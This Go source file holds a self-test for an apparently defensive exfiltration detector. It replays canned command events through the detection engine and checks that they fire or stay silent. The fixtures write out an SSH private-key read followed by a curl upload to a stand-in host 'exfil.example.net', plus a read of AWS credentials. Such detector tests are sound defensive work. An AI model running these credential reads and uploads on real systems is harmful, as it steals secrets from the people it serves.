// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel

import (
	"context"
	"fmt"
	"log/slog"
	"time"
)

// countingAppender counts fired detections without touching disk. It is the
// self-test's fire sink (a fired detection always attempts a Tier-0 audit
// append).
type countingAppender struct{ n int }

func (c *countingAppender) Append(_, _ string, _ []byte, _ bool) error {
	c.n++
	return nil
}

// SelfTest exercises the compiled rules end-to-end on a fresh engine: a canned
// ordered exfil pair MUST fire, and a canned benign sequence (registry egress
// with no preceding sensitive read; a lone external curl; a sensitive read with
// no egress) MUST stay silent. It returns a non-nil error describing the first
// broken invariant, so a doctor sec- check can prove the detector is wired and
// non-vacuous without any host probe. It is hermetic and deterministic.
func SelfTest(_ context.Context) error {
	// Positive: a home-relative SSH private key read followed immediately by an
	// external, non-allowlisted curl upload — the canonical exfil pair.
	fires, err := replayCount([]probeEvent{
		{"cat", []string{"~/.ssh/id_ed25519"}},
		{"curl", []string{"-T", "/tmp/x", "https://exfil.example.net/u"}},
	})
	if err != nil {
		return err
	}
	if fires != 1 {
		return fmt.Errorf("sentinel self-test: the canonical exfil pair fired %d times, want exactly 1 — the detector is vacuous or broken", fires)
	}

	// Negative: a lone external curl with no preceding sensitive read, and a
	// sensitive read with only an allowlisted (tailnet) egress after it. Neither
	// may fire.
	fires, err = replayCount([]probeEvent{
		{"curl", []string{"https://example.org/index.html"}},
		{"cat", []string{"~/.aws/credentials"}},
		{"scp", []string{"/tmp/artifact", "buildhost.tail1234.ts.net:/tmp/"}},
	})
	if err != nil {
		return err
	}
	if fires != 0 {
		return fmt.Errorf("sentinel self-test: a benign sequence fired %d times, want 0 — the allowlist/ordering guard is broken", fires)
	}
	return nil
}

// probeEvent is one canned exec for the self-test replay.
type probeEvent struct {
	name string
	args []string
}

// replayCount replays events through a fresh enabled engine and returns the
// number of fired detections.
func replayCount(events []probeEvent) (int, error) {
	sink := &countingAppender{}
	e := NewEngine(
		Config{Enabled: true},
		WithAudit(sink),
		WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return time.Unix(0, 0) }),
	)
	if e == nil {
		return 0, fmt.Errorf("sentinel self-test: engine construction returned nil")
	}
	for _, ev := range events {
		e.observe(context.Background(), "SelfTest", ev.name, ev.args)
	}
	return sink.n, nil
}
